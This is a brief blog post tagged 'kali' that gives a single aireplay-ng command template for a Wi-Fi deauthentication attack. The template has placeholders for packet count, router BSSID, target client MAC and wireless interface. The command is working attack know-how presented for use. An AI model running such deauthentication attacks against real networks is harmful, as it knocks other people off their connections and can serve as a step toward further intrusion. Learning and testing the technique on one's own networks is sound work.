---
layout: post
title:  "Deauthentication attack"
categories: kali
date:   2020-04-26 20:00:00 +0700
permalink: deauthentication-attack-with-aireplay/
---
Command to deauth a target from a hotspot

```
$ aireplay-ng --deauth <how many times you want the signal to be sent> -a <mac address of the router / bssid> -c <mac address of the client that you want to deauth> <your wireless interface name>
```
